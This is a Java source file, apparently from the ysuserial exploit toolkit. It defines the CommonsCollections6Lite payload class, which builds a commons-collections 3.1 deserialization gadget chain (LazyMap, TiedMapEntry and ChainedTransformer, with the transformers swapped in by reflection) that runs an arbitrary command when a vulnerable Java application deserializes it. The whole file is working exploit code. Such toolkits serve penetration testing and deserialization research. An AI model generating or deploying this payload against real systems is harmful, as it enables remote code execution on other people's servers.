package org.su18.ysuserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.cc.TransformerUtil;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollections6Lite implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers     = TransformerUtil.makeTransformer(command);
        Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
        Map           innerMap         = new HashMap();
        Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "su18");
        Map           expMap           = new HashMap();
        expMap.put(tme, "su18");
        outerMap.remove("su18");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        return expMap;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6Lite.class, args);
    }
}
